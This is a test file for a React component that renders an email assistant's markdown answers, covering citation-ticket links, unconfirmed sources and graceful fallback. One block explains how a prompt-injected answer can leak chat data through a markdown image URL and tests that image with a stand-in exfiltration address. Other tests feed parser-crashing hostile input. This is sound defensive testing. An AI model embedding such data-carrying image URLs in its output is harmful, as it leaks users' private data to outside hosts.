// @vitest-environment jsdom
import { afterEach, describe, expect, it, vi } from 'vitest'
import { render, screen, fireEvent, cleanup } from '@testing-library/react'
import '@testing-library/jest-dom/vitest'
import React from 'react'

const i18nMap: Record<string, string> = {
  'ai.panel.sourceUnconfirmed': 'unconfirmed',
  'ai.panel.sourceUnconfirmedTooltip': 'The assistant did not receive this message',
}
const stableT = (key: string) => i18nMap[key] ?? key
const stableUseTranslation = { t: stableT }
vi.mock('react-i18next', () => ({
  useTranslation: () => stableUseTranslation,
}))

// react-markdown and remark-gfm are NOT mocked: the link renderer is the thing under test and it is
// reached through the real library's `components` contract.
import AiAnswerMarkdown, { AnswerMarkdownBoundary, type AiAnswerMarkdownProps } from './AiAnswerMarkdown'
import type { CitationStatus } from '../utils/aiSourceVerdict'
import { answerMarkdownProps } from '../utils/answerMarkdown'

const T = 'k3f2x7ab'
const found: CitationStatus = { token: T, status: 'found', subject: 's', from: 'f', date: 'd' }
const known = new Map<string, CitationStatus>([[T, found]])

function renderAnswer(props: Partial<AiAnswerMarkdownProps> = {}) {
  const defaults: AiAnswerMarkdownProps = {
    content: `See [the invoice](mailref://c/${T}) for details.`,
    citations: known,
    streaming: false,
    ...props,
  }
  return render(React.createElement(AiAnswerMarkdown, defaults))
}

describe('AiAnswerMarkdown', () => {
  afterEach(() => { cleanup() })

  it('does not parse the answer again when only the callbacks change (typing in the chat input re-renders the panel)', () => {
    const parsed = vi.spyOn(answerMarkdownProps, 'urlTransform')
    const props: AiAnswerMarkdownProps = { content: `[the invoice](mailref://c/${T}) and [site](https://example.test/)`, citations: known, streaming: false }
    const { rerender } = render(React.createElement(AiAnswerMarkdown, { ...props, onOpenCitation: vi.fn() }))
    const afterFirst = parsed.mock.calls.length
    expect(afterFirst).toBeGreaterThan(0)
    rerender(React.createElement(AiAnswerMarkdown, { ...props, onOpenCitation: vi.fn(), onOpenSource: vi.fn() }))
    rerender(React.createElement(AiAnswerMarkdown, { ...props, onOpenCitation: vi.fn() }))
    expect(parsed.mock.calls.length).toBe(afterFirst)
    // and the latest callback is the one a click reaches
    const latest = vi.fn()
    rerender(React.createElement(AiAnswerMarkdown, { ...props, onOpenCitation: latest }))
    fireEvent.click(screen.getByRole('button', { name: 'the invoice' }))
    expect(latest).toHaveBeenCalledWith(T)
    // a changed answer is parsed
    rerender(React.createElement(AiAnswerMarkdown, { ...props, content: `${props.content} more`, onOpenCitation: latest }))
    expect(parsed.mock.calls.length).toBeGreaterThan(afterFirst)
    parsed.mockRestore()
  })

  it('a long answer (300 rows of bold text and ticket links) is drawn in full: formatting and active links', () => {
    const tickets = Array.from({ length: 300 }, (_, i) => `k3f2x7${'ab'[i % 2]}${'cd'[Math.floor(i / 2) % 2]}`)
    const citations = new Map<string, CitationStatus>(tickets.map(t => [t, { token: t, status: 'found', subject: 's', from: 'f', date: 'd' }]))
    const content = tickets.map((t, i) => `- **Row ${i}** [Subject ${i}](mailref://c/${t}) from someone@example.test`).join('\n')
    const { container } = renderAnswer({ content, citations })
    expect(container.querySelector('.ai-answer-plain')).toBeNull()
    expect(container.querySelectorAll('strong')).toHaveLength(300)
    expect(container.querySelectorAll('li')).toHaveLength(300)
    expect(screen.getAllByRole('button')).toHaveLength(300) // every ticket link is active
  })

  it('a table whose padded output would be enormous (1 400 columns, pipe-less rows) falls back to plain text, app alive', () => {
    const errors = vi.spyOn(console, 'error').mockImplementation(() => {})
    const header = `| ${Array(1_400).fill('a').join(' | ')} |\n| ${Array(1_400).fill('-').join(' | ')} |\n`
    const { container } = renderAnswer({ content: `[the invoice](mailref://c/${T})\n\n${header}${'x\n'.repeat(1_600)}` })
    expect(container.querySelectorAll('td').length).toBe(0)
    expect(container.querySelector('.ai-answer-plain')).not.toBeNull()
    expect(container.textContent).toContain('the invoice')
    errors.mockRestore()
  }, 60_000) // parsing the table takes seconds on a slow machine; the guard bounds memory, not time

  it('renders a link whose ticket the session knows as a button that opens it by ticket', () => {
    const onOpenCitation = vi.fn()
    renderAnswer({ onOpenCitation })
    const button = screen.getByRole('button', { name: 'the invoice' })
    expect(button).toHaveClass('ai-inline-mail-link')
    fireEvent.click(button)
    expect(onOpenCitation).toHaveBeenCalledTimes(1)
    expect(onOpenCitation).toHaveBeenCalledWith(T)
    expect(screen.queryByTestId('ai-inline-mail-unconfirmed')).toBeNull()
  })

  it('does not throw when a link is clicked without an open handler', () => {
    renderAnswer()
    expect(() => fireEvent.click(screen.getByRole('button', { name: 'the invoice' }))).not.toThrow()
  })

  it('renders a ticket the session does not know as plain text with a mark and a tooltip: no button, no anchor', () => {
    renderAnswer({ citations: new Map([[T, { token: T, status: 'unknown' }]]) })
    expect(screen.queryByRole('button')).toBeNull()
    expect(screen.queryByRole('link')).toBeNull()
    expect(document.querySelector('a')).toBeNull()
    const flagged = screen.getByTestId('ai-inline-mail-unconfirmed')
    expect(flagged).toHaveTextContent('the invoice')
    expect(flagged).toHaveTextContent('unconfirmed')
    expect(flagged).toHaveAttribute('title', 'The assistant did not receive this message')
  })

  it('renders a ticket main has not answered about yet as plain pending text, not flagged', () => {
    renderAnswer({ citations: new Map() })
    expect(screen.queryByRole('button')).toBeNull()
    expect(screen.queryByTestId('ai-inline-mail-unconfirmed')).toBeNull()
    expect(document.querySelector('.ai-inline-mail-pending')).toHaveTextContent('the invoice')
  })

  it('renders a link as plain pending text while the answer is streaming, whatever main said', () => {
    renderAnswer({ streaming: true })
    expect(screen.queryByRole('button')).toBeNull()
    expect(document.querySelector('.ai-inline-mail-pending')).toHaveTextContent('the invoice')
  })

  it('renders a place link the model composed as unconfirmed in an answer written with tickets', () => {
    renderAnswer({ content: 'See [the invoice](mailref://1/INBOX/42).' })
    expect(screen.queryByRole('button')).toBeNull()
    expect(screen.getByTestId('ai-inline-mail-unconfirmed')).toHaveTextContent('the invoice')
  })

  it('keeps an old answer\'s place link working, unflagged, and opens the PLACE', () => {
    const onOpenSource = vi.fn()
    renderAnswer({ content: 'See [the invoice](mailref://1/INBOX/42).', legacyLinks: true, onOpenSource })
    fireEvent.click(screen.getByRole('button', { name: 'the invoice' }))
    expect(onOpenSource).toHaveBeenCalledWith({ accountId: 1, folder: 'INBOX', uid: 42 })
    expect(screen.queryByTestId('ai-inline-mail-unconfirmed')).toBeNull()
  })

  it('wraps a bare ticket link the model wrote without markdown', () => {
    renderAnswer({ content: `look: mailref://c/${T}` })
    expect(screen.getByRole('button', { name: 'email' })).toBeInTheDocument()
  })

  it('opens a normal https link in a new tab and never makes it a source', () => {
    renderAnswer({ content: 'Read [docs](https://example.test/docs).' })
    const anchor = screen.getByRole('link', { name: 'docs' })
    expect(anchor).toHaveAttribute('target', '_blank')
    expect(anchor).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('shows the text of a malformed mailref, never a link', () => {
    renderAnswer({ content: 'See [broken](mailref://c/short) here.' })
    expect(screen.queryByRole('button')).toBeNull()
    expect(screen.queryByRole('link')).toBeNull()
    expect(screen.getByText('broken')).toBeInTheDocument()
  })

  // A markdown image is fetched by the browser the moment it is drawn, with no click: a prompt-injected answer can
  // carry data out in its URL (`![](https://host/?d=...)`). Images from an answer are never loaded; they are text.
  describe('images in an answer are never loaded', () => {
    const URL_WITH_DATA = 'https://exfil.example.test/p.png?d=secret-from-the-chat'

    it('a markdown image is drawn as text (alt and address), not as an <img>, and starts no network request', () => {
      const fetchSpy = vi.spyOn(globalThis, 'fetch').mockResolvedValue(new Response(''))
      const open = vi.spyOn(XMLHttpRequest.prototype, 'open')
      const { container } = renderAnswer({ content: `Look: ![a chart](${URL_WITH_DATA}) done` })
      expect(container.querySelector('img')).toBeNull()
      expect(container.innerHTML).not.toMatch(/<img/i)
      // no attribute anywhere carries the address: it is only text
      expect(container.querySelector(`[src], [srcset], [href*="exfil"]`)).toBeNull()
      expect(container).toHaveTextContent('a chart')
      expect(container).toHaveTextContent(URL_WITH_DATA)
      expect(fetchSpy).not.toHaveBeenCalled()
      expect(open).not.toHaveBeenCalled()
      fetchSpy.mockRestore()
      open.mockRestore()
    })

    it('an image inside a link, a reference-style image and a raw html <img> are all text too', () => {
      const { container } = renderAnswer({
        content: `[![x](${URL_WITH_DATA})](https://example.test/a)\n\n![y][1]\n\n<img src="${URL_WITH_DATA}">\n\n[1]: ${URL_WITH_DATA}`,
      })
      expect(container.querySelector('img')).toBeNull()
      expect(container.querySelector('[src], [srcset]')).toBeNull()
    })

    it('an ordinary link is still a link, opened in a new tab on click', () => {
      renderAnswer({ content: 'Read [docs](https://example.test/docs).' })
      expect(screen.getByRole('link', { name: 'docs' })).toHaveAttribute('href', 'https://example.test/docs')
    })
  })

  describe('a hostile answer never takes the panel down', () => {
    it('1000 nested quote markers: the panel stays alive, whatever the parser does with them', () => {
      const errors = vi.spyOn(console, 'error').mockImplementation(() => {})
      const { container } = renderAnswer({ content: `${'>'.repeat(1000)} deep` })
      expect(container).toHaveTextContent('deep')
      errors.mockRestore()
    })

    it('quote markers deep enough to overflow the parser (measured: from about 3 000): the boundary shows that answer as plain text', () => {
      const errors = vi.spyOn(console, 'error').mockImplementation(() => {})
      const { container } = renderAnswer({ content: `${'>'.repeat(5000)} deep` })
      expect(container.querySelector('.ai-answer-plain')).not.toBeNull()
      expect(container).toHaveTextContent('>>>>')
      expect(screen.queryByTestId('ai-inline-mail-unconfirmed')).toBeNull()
      errors.mockRestore()
    })

    it('a failure inside the markdown render falls back to the plain text of that answer only', () => {
      const Boom = () => { throw new RangeError('stack') }
      const errors = vi.spyOn(console, 'error').mockImplementation(() => {})
      const { container } = render(React.createElement(AnswerMarkdownBoundary, { text: 'the whole answer', resetKey: 'k', children: React.createElement(Boom) }))
      expect(container).toHaveTextContent('the whole answer')
      errors.mockRestore()
    })
  })
})
